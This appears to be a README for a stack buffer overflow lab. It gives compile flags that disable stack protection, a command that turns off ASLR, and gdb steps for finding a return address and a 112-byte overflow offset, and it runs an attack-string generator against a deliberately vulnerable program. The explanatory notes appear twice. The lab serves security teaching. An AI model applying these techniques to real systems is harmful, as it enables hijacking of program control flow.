How to run:

gcc vuln_program.c -fno-stack-protector -z execstack -static -o vuln_program
 
sudo sysctl -w kernel.randomize_va_space=0

do something by gdb as following:
/*
After compile the vuln_program.c, we got vuln_program.
	in gdb:
		disas target ==> get 0x080488cc ==> printf("\xcc\x88\x04\x08");
		disas prompt ==> get 0x6c = 108
		so we calculate 108+4 = 112, which is the attack string's length.
		so the buffer size can not be used directly.
		is what we get in disas (prompt + 4).
	So whatever the buf size is, we just check this value, and plus 4 is the size of attack string.
*/
gcc attack-string.c -o attack-string

./attack-string > attack.input

./vuln_program <./attack.input
 

PS. 
	After compile the vuln_program.c, we got vuln_program.
	in gdb:
		disas target ==> get 0x080488cc
		disas prompt ==> get 0x6c = 108
		so we calculate 108+4 = 112, which is the attack string's length.
		so the buffer size can not be used directly.
		is what we get in disas (prompt + 4).
	So whatever the buf size is, we just check this value, and plus 4 is the size of attack string.